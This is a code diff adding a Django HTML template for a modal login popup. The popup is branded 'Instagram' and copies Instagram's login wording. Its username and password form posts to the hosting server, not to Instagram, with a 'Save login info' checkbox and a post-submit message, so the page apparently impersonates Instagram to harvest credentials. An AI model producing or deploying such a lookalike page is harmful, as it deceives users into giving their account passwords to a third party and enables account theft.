@@ -1,0 +1,100 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Popup</title>
+    <style>
+        body {
+            background: rgba(0,0,0,0.4);
+            font-family: Arial;
+        }
+
+        .modal {
+            width: 400px;
+            background: #fff;
+            padding: 30px;
+            border-radius: 20px;
+            margin: 100px auto;
+            position: relative;
+            text-align: center;
+        }
+
+        .close {
+            position: absolute;
+            right: 15px;
+            top: 10px;
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        h1 {
+            font-family: cursive;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(to right, #5a67d8, #667eea);
+            color: white;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .forgot {
+            margin-top: 15px;
+        }
+
+        .checkbox {
+            text-align: left;
+            margin-top: 10px;
+        }
+
+        .msg {
+            color: green;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="modal">
+    <div class="close">✖</div>
+
+    <h1>Instagram</h1>
+
+    <form method="POST">
+        {% csrf_token %}
+
+        <input type="text" name="username"
+               placeholder="Phone number, username, or email" required>
+
+        <input type="password" name="password"
+               placeholder="Password" required>
+
+        <div class="checkbox">
+            <input type="checkbox"> Save login info
+        </div>
+
+        <button class="login-btn">Log in</button>
+    </form>
+
+    <div class="forgot">Forgot password?</div>
+
+    {% if message %}
+        <div class="msg">{{ message }}</div>
+    {% endif %}
+</div>
+
+</body>
+</html>
